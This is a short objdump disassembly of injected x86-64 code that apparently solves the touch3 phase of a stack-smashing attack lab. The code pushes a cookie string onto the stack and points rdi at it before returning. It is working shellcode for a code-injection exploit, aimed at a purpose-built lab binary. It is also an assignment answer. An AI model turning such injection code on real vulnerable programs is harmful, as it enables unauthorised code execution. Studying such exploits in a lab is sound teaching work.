
ctarget_touch3_injection_code.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	41 54                	push   %r12
   2:	49 bc 61 66 37 39 39 	movabs $0x3539623939376661,%r12
   9:	62 39 35 
   c:	4c 89 a4 24 f0 0f 00 	mov    %r12,0xff0(%rsp)
  13:	00 
  14:	48 8d bc 24 f0 0f 00 	lea    0xff0(%rsp),%rdi
  1b:	00 
  1c:	41 5c                	pop    %r12
  1e:	c3                   	retq   
